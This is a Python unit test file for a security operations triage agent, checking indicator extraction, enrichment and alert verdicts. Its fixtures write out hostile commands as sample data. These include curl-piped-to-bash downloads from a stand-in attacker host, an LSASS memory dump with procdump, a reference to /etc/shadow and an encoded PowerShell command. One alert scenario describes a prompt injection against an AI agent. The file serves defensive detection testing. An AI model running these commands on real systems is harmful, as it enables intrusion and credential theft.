"""
Unit & Integration Tests for Autonomous SOC Triage Agent (Pipeline B).
Validates deterministic IOC extraction, baseline correlation, zero-hallucination guardrails,
and Pydantic output contracts.
"""
import unittest
import json
from pathlib import Path
from pydantic import ValidationError

from autonomous_triage.triage_agent import TriageEngine
from autonomous_triage.baseline_store import BaselineStore
from autonomous_triage.output_schema import TriageVerdict, IOCExtraction, TriageInvestigationBrief


class TestAutonomousTriageAgent(unittest.TestCase):

    def setUp(self):
        self.engine = TriageEngine(use_mock=True)
        self.raw_alerts_path = Path(__file__).resolve().parent.parent / "sample_data" / "raw_alerts.json"

    def test_ioc_extraction_accuracy(self):
        """Verifies deterministic parsing of IPs, hashes, commands, users, and paths."""
        sample_payload = {
            "alert_id": "ALT-TEST-99",
            "user": "sec_analyst",
            "cmd": "curl -s http://198.51.100.12/update.bin | bash",
            "hashes": ["d41d8cd98f00b204e9800998ecf8427e"],
            "target_file": "/etc/shadow"
        }
        iocs = self.engine.extract_iocs(sample_payload)
        self.assertIn("198.51.100.12", iocs.ips)
        self.assertIn("sec_analyst", iocs.usernames)
        self.assertTrue(any("curl" in c for c in iocs.commands))
        self.assertIn("d41d8cd98f00b204e9800998ecf8427e", iocs.hashes)
        self.assertIn("/etc/shadow", iocs.file_paths)

    def test_deterministic_enrichment_entropy_and_cidr(self):
        """Validates Shannon entropy math and RFC CIDR categorization."""
        iocs = IOCExtraction(
            ips=["10.10.1.5", "127.0.0.1", "198.51.100.22", "8.8.8.8"],
            commands=["powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="],
            domains=["tunnel.evilcorp-c2.com"]
        )
        enrichment = self.engine.run_deterministic_enrichers(iocs, {})
        
        # CIDR mapping
        self.assertEqual(enrichment.cidr_breakdown["10.10.1.5"], "Private RFC1918 (Internal LAN)")
        self.assertEqual(enrichment.cidr_breakdown["127.0.0.1"], "Loopback (127.0.0.0/8)")
        self.assertEqual(enrichment.cidr_breakdown["198.51.100.22"], "External Threat Emulation Range (RFC 5737 Testnet)")
        self.assertEqual(enrichment.cidr_breakdown["8.8.8.8"], "Public / External WAN (Untrusted Internet)")

        # Entropy scores (base64 and DGA have high entropy)
        self.assertGreater(enrichment.shannon_entropy_scores["tunnel.evilcorp-c2.com"], 3.0)

    def test_baseline_store_integration(self):
        """Verifies querying baseline context from local telemetry.db."""
        store = BaselineStore()
        # Query known user in telemetry.db
        summary = store.get_user_activity_summary("asmith")
        self.assertEqual(summary["user_name"], "asmith")
        self.assertIsInstance(summary["distinct_hosts"], list)
        self.assertIsInstance(summary["top_processes"], list)

    def test_false_positive_reduction_scenario(self):
        """Scenario 3: Noisy maintenance alert for system_deployer must be auto-triaged as FALSE_POSITIVE."""
        alert_fp = {
            "alert_id": "ALERT-EP-1001",
            "rule_name": "OFFICE_SPAWNING_POWERSHELL_T1059_001",
            "user": "system_deployer",
            "cmd": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT_Deploy\\weekly_maintenance.ps1",
            "host": "wkstn-corp-04",
            "severity": "MEDIUM"
        }
        brief = self.engine.triage_alert(alert_fp)
        verdict = brief.verdict

        self.assertEqual(verdict.verdict, "FALSE_POSITIVE")
        self.assertGreaterEqual(verdict.confidence_score, 0.90)
        self.assertIn("system_deployer", verdict.root_cause_analysis)
        self.assertIn("Auto-suppress", verdict.immediate_containment_action)
        self.assertIn("Closed automatically", verdict.analyst_investigation_notes)

    def test_true_positive_ai_prompt_injection_scenario(self):
        """Scenario 1: AI Agent prompt injection leading to tool abuse must be triaged as TRUE_POSITIVE."""
        alert_tp = {
            "alert_id": "ALERT-AI-1048",
            "rule_name": "AI_AGENT_INDIRECT_INJECTION_EXFILTRATION",
            "user": "agent_researcher_02",
            "cmd": "curl http://attacker-c2.net/payload.sh | bash",
            "host": "srv-prod-ai-01",
            "severity": "CRITICAL"
        }
        brief = self.engine.triage_alert(alert_tp)
        verdict = brief.verdict

        self.assertEqual(verdict.verdict, "TRUE_POSITIVE")
        self.assertGreaterEqual(verdict.confidence_score, 0.95)
        self.assertIn("AML.T0054", verdict.mitre_mapping)
        self.assertIn("terminate AI Agent", verdict.immediate_containment_action)

    def test_true_positive_lsass_dump_scenario(self):
        """Scenario 2: Credential dump via procdump targeting LSASS must be triaged as TRUE_POSITIVE."""
        alert_lsass = {
            "alert_id": "ALERT-EP-1002",
            "rule_name": "LSASS_MEMORY_DUMP_T1003_001",
            "user": "asmith",
            "process_name": "procdump64.exe",
            "cmd": "procdump64.exe -ma lsass.exe C:\\temp\\lsass.dmp",
            "host": "dc-prod-01",
            "severity": "CRITICAL"
        }
        brief = self.engine.triage_alert(alert_lsass)
        verdict = brief.verdict

        self.assertEqual(verdict.verdict, "TRUE_POSITIVE")
        self.assertIn("T1003.001", verdict.mitre_mapping)
        self.assertIn("Isolate host", verdict.immediate_containment_action)

    def test_pydantic_schema_validation_enforcement(self):
        """Ensures strict Pydantic v2 data bounds (confidence range, required fields)."""
        # Valid instantiation
        valid_v = TriageVerdict(
            alert_id="TEST-01",
            verdict="TRUE_POSITIVE",
            confidence_score=0.88,
            root_cause_analysis="Evidence confirmed.",
            mitre_mapping=["T1059"],
            analyst_investigation_notes="Escalated."
        )
        self.assertEqual(valid_v.confidence_score, 0.88)

        # Invalid confidence (> 1.0) must raise ValidationError
        with self.assertRaises(ValidationError):
            TriageVerdict(
                alert_id="TEST-02",
                verdict="TRUE_POSITIVE",
                confidence_score=1.5,
                root_cause_analysis="Out of bounds",
                mitre_mapping=[],
                analyst_investigation_notes=""
            )

    def test_ads_markdown_brief_generation(self):
        """Verifies ADS markdown brief formatting contains required section headers."""
        alert_tp = {
            "alert_id": "ALERT-AI-1048",
            "rule_name": "AI_AGENT_INDIRECT_INJECTION_EXFILTRATION",
            "user": "agent_researcher_02",
            "cmd": "curl http://attacker-c2.net/payload.sh | bash",
            "severity": "CRITICAL"
        }
        brief = self.engine.triage_alert(alert_tp)
        md = brief.ads_markdown_brief

        self.assertIn("# Autonomous SOC Triage Dossier: ALERT-AI-1048", md)
        self.assertIn("## 1. Executive Disposition", md)
        self.assertIn("## 2. Root Cause Analysis", md)
        self.assertIn("## 3. Evidence Matrix & Baseline Correlation", md)
        self.assertIn("## 4. Extracted Indicators of Compromise (IOCs)", md)
        self.assertIn("## 5. Analyst Investigation Notes & Audit Trail", md)


if __name__ == "__main__":
    unittest.main()
